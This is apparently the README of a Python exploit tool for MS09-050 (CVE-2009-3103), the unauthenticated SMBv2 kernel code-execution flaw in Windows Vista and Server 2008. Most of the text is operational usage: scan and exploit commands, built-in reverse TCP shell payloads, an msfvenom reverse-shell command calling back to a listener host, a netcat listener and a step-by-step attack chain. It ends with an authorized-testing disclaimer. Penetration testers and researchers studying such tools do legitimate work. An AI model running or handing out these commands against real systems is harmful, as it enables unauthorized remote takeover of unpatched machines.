# MS09-050 — SMBv2 Remote Code Execution Exploit

**CVE-2009-3103**

## The Vulnerability

Windows Vista and Server 2008 introduced SMBv2 with a new kernel driver, `srv2.sys`. This driver fails to validate the `Process Id High` field in SMB negotiate requests. By sending a specially crafted value in this field, an attacker causes `srv2.sys` to index into a function pointer table with a controlled value, dereferencing an attacker-supplied address.

The result is arbitrary code execution in kernel context, no authentication required. The attacker only needs to reach port 445.

Microsoft patched this in October 2009 (KB975517). Any unpatched Vista SP1/SP2 or Server 2008 SP1 system is vulnerable.

## Affected Systems

| Target OS                          | Architecture |
|------------------------------------|--------------|
| Windows Vista SP1                  | x86          |
| Windows Vista SP2                  | x86 / x64    |
| Windows Server 2008 SP1            | x86 / x64    |
| Windows Server 2008 SP1 (pre-R2)   | x64          |

## Features

- **Scanner module**: fingerprints target OS and architecture via SMB negotiation, reports vulnerability status
- **Auto-detect architecture**: scanner feeds arch info directly into the exploit, no manual guessing
- **Built-in payloads**: standalone reverse TCP shell for x86 and x64, no Metasploit required
- **msfvenom integration**: optional shellcode generation via msfvenom when available
- **Custom shellcode support**: load any raw shellcode file
- **Structured output**: `[+]` success, `[-]` error, `[!]` warning, `[*]` info

## Installation

```bash
git clone https://github.com/bytejmp/MS09-050.git
cd MS09-050
```

**Requirements:**
- Python 3.6+
- `rpcclient` (from `smbclient` package), used to trigger the payload after injection
- `msfvenom`, only needed if using the `--msfvenom` flag

On Debian/Ubuntu:
```bash
sudo apt install smbclient
```

On Arch Linux:
```bash
sudo pacman -S smbclient
```

## Usage

### Scan a target

```bash
python3 MS09.py scan -t 192.168.1.10
```

Output:
```
[*] Scanning 192.168.1.10:445...
[+] Target 192.168.1.10 is reachable
[+] SMBv2 supported
[*] OS: Windows Vista (TM) Ultimate 6001 Service Pack 1
[*] Architecture: x86
[+] Target appears VULNERABLE to MS09-050
```

### Exploit with built-in payload (recommended)

Auto-detect architecture:
```bash
python3 MS09.py exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444
```

Specify architecture manually:
```bash
python3 MS09.py exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444 -a x64
```

Before running, start your listener:
```bash
nc -lvnp 4444
```

### Exploit with msfvenom shellcode

```bash
python3 MS09.py exploit -t 192.168.1.10 --msfvenom -l 10.0.0.5 -p 4444 -a x86
```

### Exploit with custom shellcode file

Generate raw shellcode with any tool:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 EXITFUNC=thread -f raw -o shellcode.bin
```

Then feed it to the exploit:
```bash
python3 MS09.py exploit -t 192.168.1.10 -s shellcode.bin -a x86
```

### Full help

```
$ python3 MS09.py -h

usage: MS09.py [-h] {scan,exploit} ...

MS09-050 SMBv2 Remote Code Execution Exploit (CVE-2009-3103)

positional arguments:
  {scan,exploit}  Operation mode
    scan          Scan target for MS09-050 vulnerability
    exploit       Send exploit to target

$ python3 MS09.py exploit -h

usage: MS09.py exploit [-h] -t TARGET [-P PORT] [-a {x86,x64}]
                        (--payload | --msfvenom | -s FILE)
                        [-l LHOST] [-p LPORT]

options:
  -t, --target    Target IP address
  -P, --port      SMB port (default: 445)
  -a, --arch      Target architecture (auto-detected if omitted)
  --payload       Use built-in reverse shell payload (no Metasploit needed)
  --msfvenom      Generate shellcode with msfvenom
  -s, --shellcode Path to raw shellcode file
  -l, --lhost     Listener IP address
  -p, --lport     Listener port
```

## Project Structure

```
MS09/
├── MS09.py              # Main entry point
├── README.md
└── lib/
    ├── __init__.py
    ├── output.py        # Standardized output formatting
    ├── scanner.py       # SMBv2 vulnerability scanner
    ├── payloads.py      # Built-in shellcode (reverse TCP shell)
    └── exploit.py       # Exploit buffer construction and delivery
```

## How It Works

1. **Scanner** sends an SMB1 `Negotiate Protocol Request` to fingerprint the target OS version and architecture
2. **Exploit** crafts a malformed SMBv2 negotiate request that overflows a buffer in `srv2.sys`
3. A **sysenter hook stager** is used to gain initial code execution in kernel context
4. The stager transitions to user-mode and executes the provided shellcode (reverse shell)
5. **rpcclient** triggers the injected code by initiating an SMB authentication attempt

## References

- [CVE-2009-3103](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103)
- [Microsoft Security Bulletin MS09-050](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-050)
- [SRV2.SYS SMBv2 Vulnerability Analysis](https://www.cvedetails.com/cve/CVE-2009-3103/)

---

## Disclaimer

**This tool is provided for authorized penetration testing and educational purposes only.**

Unauthorized access to computer systems is a criminal offense in most jurisdictions. You must obtain explicit written permission from the system owner before using this tool against any target. The authors assume no liability and are not responsible for any misuse or damage caused by this software.

By using this tool, you agree that:
- You have **written authorization** to test the target system
- You are operating within the scope of a **legitimate security assessment**
- You accept **full responsibility** for your actions
- You will **comply with all applicable laws** and regulations

**Use responsibly. Hack ethically.**
